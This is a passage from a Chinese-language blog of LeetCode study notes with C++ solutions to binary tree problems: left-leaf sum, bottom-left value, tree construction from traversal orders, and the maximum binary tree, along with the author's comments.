<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//迭代</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">sumOfLeftLeaves</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        queue&lt;TreeNode*&gt; q;</span><br><span class="line">        <span class="keyword">if</span>(root)</span><br><span class="line">            q.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;<span class="comment">//和</span></span><br><span class="line">        <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            TreeNode *node = q.<span class="built_in">front</span>();</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="comment">//判断node-&gt;left是左叶子</span></span><br><span class="line">            <span class="keyword">if</span>(node-&gt;left!=<span class="literal">nullptr</span> &amp;&amp; node-&gt;left-&gt;left==<span class="literal">nullptr</span>&amp;&amp;node-&gt;left-&gt;right==<span class="literal">nullptr</span>)</span><br><span class="line">                sum += node-&gt;left-&gt;val;<span class="comment">//更新</span></span><br><span class="line">            <span class="keyword">if</span>(node-&gt;left)</span><br><span class="line">                q.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">            <span class="keyword">if</span>(node-&gt;right)</span><br><span class="line">                q.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="513-找树左下角的值"><a href="#513-找树左下角的值" class="headerlink" title="513 找树左下角的值"></a>513 找树左下角的值</h3><p>给定一个二叉树的 根节点 root，请找出该二叉树的【最底层 最左边节点】的值。<br>假设二叉树中至少有一个节点。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//递归+回溯</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> maxDepth = INT_MIN;</span><br><span class="line">    <span class="keyword">int</span> result;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">traversal</span><span class="params">(TreeNode* root, <span class="keyword">int</span> depth)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//当遇到叶子节点的时候，就需要统计一下最大的深度</span></span><br><span class="line">        <span class="keyword">if</span> (root-&gt;left == <span class="literal">NULL</span> &amp;&amp; root-&gt;right == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (depth &gt; maxDepth) &#123;</span><br><span class="line">                maxDepth = depth;</span><br><span class="line">                result = root-&gt;val;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;left) &#123;</span><br><span class="line">            <span class="built_in">traversal</span>(root-&gt;left, depth + <span class="number">1</span>); <span class="comment">// 隐藏着回溯</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;right) &#123;</span><br><span class="line">            <span class="built_in">traversal</span>(root-&gt;right, depth + <span class="number">1</span>); <span class="comment">// 隐藏着回溯</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findBottomLeftValue</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">traversal</span>(root, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//学习 回溯【拆开 分析】  不懂！！！</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> maxDepth = INT_MIN;</span><br><span class="line">    <span class="keyword">int</span> result;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">traversal</span><span class="params">(TreeNode* root, <span class="keyword">int</span> depth)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;left == <span class="literal">NULL</span> &amp;&amp; root-&gt;right == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (depth &gt; maxDepth) &#123;</span><br><span class="line">                maxDepth = depth;</span><br><span class="line">                result = root-&gt;val;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;left) &#123;</span><br><span class="line">            depth++;</span><br><span class="line">            <span class="built_in">traversal</span>(root-&gt;left, depth);</span><br><span class="line">            depth--; <span class="comment">// 回溯</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;right) &#123;</span><br><span class="line">            depth++;</span><br><span class="line">            <span class="built_in">traversal</span>(root-&gt;right, depth);</span><br><span class="line">            depth--; <span class="comment">// 回溯</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findBottomLeftValue</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">traversal</span>(root, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    迭代：层序遍历 【好理解】</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findBottomLeftValue</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        queue&lt;TreeNode*&gt; q;</span><br><span class="line">        <span class="keyword">if</span>(root)</span><br><span class="line">            q.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">int</span> left = root-&gt;val;</span><br><span class="line">        <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            <span class="keyword">int</span> size = q.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size;i++)&#123;</span><br><span class="line">                TreeNode *node = q.<span class="built_in">front</span>();</span><br><span class="line">                q.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">if</span>(i==<span class="number">0</span>)&#123;<span class="comment">//记录【每层 第一个结点】</span></span><br><span class="line">                    left = node-&gt;val;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(node-&gt;left)<span class="comment">//这里的顺序 还是：先左子树</span></span><br><span class="line">                    q.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">                <span class="keyword">if</span>(node-&gt;right)<span class="comment">//后右子树</span></span><br><span class="line">                    q.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="106-从-中序-与-后序-遍历序列构造二叉树"><a href="#106-从-中序-与-后序-遍历序列构造二叉树" class="headerlink" title="106 从[中序]与[后序]遍历序列构造二叉树"></a>106 从[中序]与[后序]遍历序列构造二叉树</h2><p>给定两个整数数组 inorder 和 postorder ，其中 inorder 是二叉树的中序遍历， postorder 是同一棵树的后序遍历，请你构造并返回这颗 二叉树 。<br><img src="https://img-blog.csdnimg.cn/59fdfa2e08764f5999106cdb46866633.png"><br><strong>思路：</strong><br>    第一步：如果数组大小为零的话，说明是空节点了。</p>
<pre><code>第二步：如果不为空，那么取后序数组最后一个元素作为节点元素。

第三步：找到后序数组最后一个元素在中序数组的位置，作为切割点

第四步：【切割中序数组】，切成中序左数组和中序右数组 （顺序别搞反了，一定是先切中序数组）

第五步：【切割后序数组】，切成后序左数组和后序右数组

第六步：【递归】 处理左区间和右区间
</code></pre>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">traversal</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; inorder,vector&lt;<span class="keyword">int</span>&gt;&amp; postorder)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(postorder.<span class="built_in">size</span>()==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">int</span> rootValue = postorder[postorder.<span class="built_in">size</span>()<span class="number">-1</span>];<span class="comment">//确定树的 根节点：后序遍历的最后一个结点</span></span><br><span class="line">        TreeNode *root = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(rootValue);<span class="comment">//新建一结点，根节点确定为rootValue</span></span><br><span class="line">        <span class="keyword">if</span>(postorder.<span class="built_in">size</span>()==<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> root;<span class="comment">//当后序遍历数组中 只剩下一个结点时，直接返回 该结点</span></span><br><span class="line">        <span class="keyword">int</span> IN_index;</span><br><span class="line">        <span class="keyword">for</span>(IN_index=<span class="number">0</span>;IN_index&lt;inorder.<span class="built_in">size</span>();IN_index++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(inorder[IN_index]==rootValue)</span><br><span class="line">                <span class="keyword">break</span>;<span class="comment">//寻找中序数组中 节点值等于rootValue 的点 的 位置（下标）</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//切割中序数组</span></span><br><span class="line">        <span class="comment">//中序 左区间：左闭右开[0,In_index)</span></span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">leftInorder</span><span class="params">(inorder.begin(),inorder.begin()+IN_index)</span></span>;</span><br><span class="line">        <span class="comment">//中序 右区间：左闭右开[In_index + 1 , inorder.size()) [In_index,end)</span></span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">rightInorder</span><span class="params">(inorder.begin()+IN_index+<span class="number">1</span>,inorder.end())</span></span>;</span><br><span class="line">        <span class="comment">//去掉 后序数组中 末尾元素</span></span><br><span class="line">        postorder.<span class="built_in">resize</span>(postorder.<span class="built_in">size</span>()<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//切割后序数组</span></span><br><span class="line">        <span class="comment">//后序 左区间：左闭右开[0,In_index)</span></span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">leftPostorder</span><span class="params">(postorder.begin(),postorder.begin()+IN_index)</span></span>;</span><br><span class="line">        <span class="comment">//后序 右区间：左闭右开[In_index,inorder.size()) [In_index,end)</span></span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">rightPostorder</span><span class="params">(postorder.begin()+IN_index,postorder.end())</span></span>;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            后序切割中的 IN_index 可以改为 inorder.size()</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        root-&gt;left = <span class="built_in">traversal</span>(leftInorder,leftPostorder);</span><br><span class="line">        root-&gt;right = <span class="built_in">traversal</span>(rightInorder,rightPostorder);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">TreeNode* <span class="title">buildTree</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; inorder, vector&lt;<span class="keyword">int</span>&gt;&amp; postorder)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(inorder.<span class="built_in">size</span>()==<span class="number">0</span> || postorder.<span class="built_in">size</span>()==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">traversal</span>(inorder,postorder);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//优化后，未看！！！！！（因为每层递归定义了新的vector（就是数组），既耗时又耗空间）</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">// 中序区间：[inorderBegin, inorderEnd)，后序区间[postorderBegin, postorderEnd)</span></span><br><span class="line">    <span class="function">TreeNode* <span class="title">traversal</span> <span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; inorder, <span class="keyword">int</span> inorderBegin, <span class="keyword">int</span> inorderEnd, vector&lt;<span class="keyword">int</span>&gt;&amp; postorder, <span class="keyword">int</span> postorderBegin, <span class="keyword">int</span> postorderEnd)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (postorderBegin == postorderEnd) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> rootValue = postorder[postorderEnd - <span class="number">1</span>];</span><br><span class="line">        TreeNode* root = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(rootValue);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (postorderEnd - postorderBegin == <span class="number">1</span>) <span class="keyword">return</span> root;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> delimiterIndex;</span><br><span class="line">        <span class="keyword">for</span> (delimiterIndex = inorderBegin; delimiterIndex &lt; inorderEnd; delimiterIndex++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (inorder[delimiterIndex] == rootValue) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 切割中序数组</span></span><br><span class="line">        <span class="comment">// 左中序区间，左闭右开[leftInorderBegin, leftInorderEnd)</span></span><br><span class="line">        <span class="keyword">int</span> leftInorderBegin = inorderBegin;</span><br><span class="line">        <span class="keyword">int</span> leftInorderEnd = delimiterIndex;</span><br><span class="line">        <span class="comment">// 右中序区间，左闭右开[rightInorderBegin, rightInorderEnd)</span></span><br><span class="line">        <span class="keyword">int</span> rightInorderBegin = delimiterIndex + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> rightInorderEnd = inorderEnd;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 切割后序数组</span></span><br><span class="line">        <span class="comment">// 左后序区间，左闭右开[leftPostorderBegin, leftPostorderEnd)</span></span><br><span class="line">        <span class="keyword">int</span> leftPostorderBegin =  postorderBegin;</span><br><span class="line">        <span class="keyword">int</span> leftPostorderEnd = postorderBegin + delimiterIndex - inorderBegin; <span class="comment">// 终止位置是 需要加上 中序区间的大小size</span></span><br><span class="line">        <span class="comment">// 右后序区间，左闭右开[rightPostorderBegin, rightPostorderEnd)</span></span><br><span class="line">        <span class="keyword">int</span> rightPostorderBegin = postorderBegin + (delimiterIndex - inorderBegin);</span><br><span class="line">        <span class="keyword">int</span> rightPostorderEnd = postorderEnd - <span class="number">1</span>; <span class="comment">// 排除最后一个元素，已经作为节点了</span></span><br><span class="line"></span><br><span class="line">        root-&gt;left = <span class="built_in">traversal</span>(inorder, leftInorderBegin, leftInorderEnd,  postorder, leftPostorderBegin, leftPostorderEnd);</span><br><span class="line">        root-&gt;right = <span class="built_in">traversal</span>(inorder, rightInorderBegin, rightInorderEnd, postorder, rightPostorderBegin, rightPostorderEnd);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">buildTree</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; inorder, vector&lt;<span class="keyword">int</span>&gt;&amp; postorder)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (inorder.<span class="built_in">size</span>() == <span class="number">0</span> || postorder.<span class="built_in">size</span>() == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        <span class="comment">// 左闭右开的原则</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">traversal</span>(inorder, <span class="number">0</span>, inorder.<span class="built_in">size</span>(), postorder, <span class="number">0</span>, postorder.<span class="built_in">size</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="105-从前序与中序遍历序列构造二叉树"><a href="#105-从前序与中序遍历序列构造二叉树" class="headerlink" title="105 从前序与中序遍历序列构造二叉树"></a>105 从前序与中序遍历序列构造二叉树</h2><p>给定两个整数数组 preorder 和 inorder ，其中 preorder 是二叉树的先序遍历， inorder 是同一棵树的中序遍历，请构造二叉树并返回其根节点。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">traversal</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; preorder,vector&lt;<span class="keyword">int</span>&gt;&amp; inorder)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preorder.<span class="built_in">size</span>()==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">int</span> rootValue = preorder[<span class="number">0</span>];<span class="comment">//确定树的 根节点：前序遍历的 第一个结点</span></span><br><span class="line">        TreeNode *root = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(rootValue);<span class="comment">//新建一结点，根节点确定为rootValue</span></span><br><span class="line">        <span class="keyword">if</span>(preorder.<span class="built_in">size</span>()==<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> root;<span class="comment">//当后序遍历数组中 只剩下一个结点时，直接返回 该结点</span></span><br><span class="line">        <span class="keyword">int</span> IN_index;</span><br><span class="line">        <span class="keyword">for</span>(IN_index=<span class="number">0</span>;IN_index&lt;inorder.<span class="built_in">size</span>();IN_index++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(inorder[IN_index]==rootValue)</span><br><span class="line">                <span class="keyword">break</span>;<span class="comment">//寻找中序数组中 节点值等于rootValue 的点 的 位置（下标）</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//切割中序数组</span></span><br><span class="line">        <span class="comment">//中序 左区间：左闭右开[0,In_index)</span></span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">leftInorder</span><span class="params">(inorder.begin(),inorder.begin()+IN_index)</span></span>;</span><br><span class="line">        <span class="comment">//中序 右区间：左闭右开[In_index + 1 , inorder.size()) [In_index,end)</span></span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">rightInorder</span><span class="params">(inorder.begin()+IN_index+<span class="number">1</span>,inorder.end())</span></span>;</span><br><span class="line">        <span class="comment">//去掉 中序数组中 首元素(与后序数组的不同之处)</span></span><br><span class="line">        <span class="built_in">reverse</span>(preorder.<span class="built_in">begin</span>(),preorder.<span class="built_in">end</span>());</span><br><span class="line">        preorder.<span class="built_in">resize</span>(preorder.<span class="built_in">size</span>()<span class="number">-1</span>);</span><br><span class="line">        <span class="built_in">reverse</span>(preorder.<span class="built_in">begin</span>(),preorder.<span class="built_in">end</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//切割前序数组</span></span><br><span class="line">        <span class="comment">//前序 左区间：左闭右开[0,In_index)</span></span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">leftPreorder</span><span class="params">(preorder.begin(),preorder.begin()+IN_index)</span></span>;</span><br><span class="line">        <span class="comment">//前序 右区间：左闭右开[In_index,inorder.size()) [In_index,end)</span></span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">rightPreorder</span><span class="params">(preorder.begin()+IN_index,preorder.end())</span></span>;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            后序切割中的 IN_index 可以改为 inorder.size()</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        root-&gt;left = <span class="built_in">traversal</span>(leftPreorder,leftInorder);</span><br><span class="line">        root-&gt;right = <span class="built_in">traversal</span>(rightPreorder,rightInorder);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">TreeNode* <span class="title">buildTree</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; preorder, vector&lt;<span class="keyword">int</span>&gt;&amp; inorder)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preorder.<span class="built_in">size</span>()==<span class="number">0</span> || inorder.<span class="built_in">size</span>()==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">traversal</span>(preorder,inorder);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">        <span class="function">TreeNode* <span class="title">traversal</span> <span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; inorder, <span class="keyword">int</span> inorderBegin, <span class="keyword">int</span> inorderEnd, vector&lt;<span class="keyword">int</span>&gt;&amp; preorder, <span class="keyword">int</span> preorderBegin, <span class="keyword">int</span> preorderEnd)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (preorderBegin == preorderEnd) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> rootValue = preorder[preorderBegin]; <span class="comment">// 注意用preorderBegin 不要用0</span></span><br><span class="line">        TreeNode* root = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(rootValue);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (preorderEnd - preorderBegin == <span class="number">1</span>) <span class="keyword">return</span> root;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> delimiterIndex;</span><br><span class="line">        <span class="keyword">for</span> (delimiterIndex = inorderBegin; delimiterIndex &lt; inorderEnd; delimiterIndex++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (inorder[delimiterIndex] == rootValue) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 切割中序数组</span></span><br><span class="line">        <span class="comment">// 中序左区间，左闭右开[leftInorderBegin, leftInorderEnd)</span></span><br><span class="line">        <span class="keyword">int</span> leftInorderBegin = inorderBegin;</span><br><span class="line">        <span class="keyword">int</span> leftInorderEnd = delimiterIndex;</span><br><span class="line">        <span class="comment">// 中序右区间，左闭右开[rightInorderBegin, rightInorderEnd)</span></span><br><span class="line">        <span class="keyword">int</span> rightInorderBegin = delimiterIndex + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> rightInorderEnd = inorderEnd;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 切割前序数组</span></span><br><span class="line">        <span class="comment">// 前序左区间，左闭右开[leftPreorderBegin, leftPreorderEnd)</span></span><br><span class="line">        <span class="keyword">int</span> leftPreorderBegin =  preorderBegin + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> leftPreorderEnd = preorderBegin + <span class="number">1</span> + delimiterIndex - inorderBegin; <span class="comment">// 终止位置是起始位置加上中序左区间的大小size</span></span><br><span class="line">        <span class="comment">// 前序右区间, 左闭右开[rightPreorderBegin, rightPreorderEnd)</span></span><br><span class="line">        <span class="keyword">int</span> rightPreorderBegin = preorderBegin + <span class="number">1</span> + (delimiterIndex - inorderBegin);</span><br><span class="line">        <span class="keyword">int</span> rightPreorderEnd = preorderEnd;</span><br><span class="line"></span><br><span class="line">        root-&gt;left = <span class="built_in">traversal</span>(inorder, leftInorderBegin, leftInorderEnd,  preorder, leftPreorderBegin, leftPreorderEnd);</span><br><span class="line">        root-&gt;right = <span class="built_in">traversal</span>(inorder, rightInorderBegin, rightInorderEnd, preorder, rightPreorderBegin, rightPreorderEnd);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">buildTree</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; preorder, vector&lt;<span class="keyword">int</span>&gt;&amp; inorder)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (inorder.<span class="built_in">size</span>() == <span class="number">0</span> || preorder.<span class="built_in">size</span>() == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 参数坚持左闭右开的原则</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">traversal</span>(inorder, <span class="number">0</span>, inorder.<span class="built_in">size</span>(), preorder, <span class="number">0</span>, preorder.<span class="built_in">size</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="654-最大二叉树——划分区间"><a href="#654-最大二叉树——划分区间" class="headerlink" title="654 最大二叉树——划分区间"></a>654 最大二叉树——划分区间</h3><p>给定一个不含重复元素的整数数组。一个以此数组构建的最大二叉树定义如下：</p>
<pre><code>二叉树的根是数组中的最大元素。
左子树是通过数组中最大值左边部分构造出的最大二叉树。
右子树是通过数组中最大值右边部分构造出的最大二叉树。
</code></pre>
<p>通过给定的数组构建最大二叉树，并且输出这个树的根节点。<br><img src="https://img-blog.csdnimg.cn/9945c287508e4b36b00690e471950aaf.png"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">buide</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span></span>&#123;</span><br><span class="line">        TreeNode *root = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">0</span>);<span class="comment">//构建根结点</span></span><br><span class="line">        <span class="keyword">if</span>(nums.<span class="built_in">size</span>()==<span class="number">1</span>)&#123;</span><br><span class="line">            root-&gt;val = nums[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//找最大值：获取最大值 和 其位置下标</span></span><br><span class="line">        <span class="keyword">int</span> max_val = INT_MIN;</span><br><span class="line">        <span class="keyword">int</span> max_index;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;nums.<span class="built_in">size</span>())&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] &gt; max_val)&#123;</span><br><span class="line">                max_index = i;</span><br><span class="line">                max_val = nums[i];</span><br><span class="line">            &#125;</span><br><span class="line">            i++;<span class="comment">//这个 while 循环条件总是忘记</span></span><br><span class="line">        &#125;</span><br><span class="line">        root-&gt;val = max_val;</span><br><span class="line">        <span class="comment">//为了保证 左区间至少有一个 结点</span></span><br><span class="line">        <span class="keyword">if</span>(max_index &gt; <span class="number">0</span>)&#123;<span class="comment">//划分左区间</span></span><br><span class="line">            <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">leftNums</span><span class="params">(nums.begin(),nums.begin()+max_index)</span></span>;</span><br><span class="line">            root-&gt;left = <span class="built_in">buide</span>(leftNums);<span class="comment">//递归构建</span></span><br><span class="line">        &#125;</span><br><span class="line">         <span class="comment">//为了保证 右区间至少有一个 结点</span></span><br><span class="line">        <span class="keyword">if</span>(max_index &lt; nums.<span class="built_in">size</span>()<span class="number">-1</span>)&#123;<span class="comment">//划分右区间</span></span><br><span class="line">            <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">rightNums</span><span class="params">(nums.begin()+max_index+<span class="number">1</span>,nums.end())</span></span>;</span><br><span class="line">            root-&gt;right = <span class="built_in">buide</span>(rightNums);<span class="comment">//递归构建</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">TreeNode* <span class="title">constructMaximumBinaryTree</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums.<span class="built_in">size</span>()==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">buide</span>(nums);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
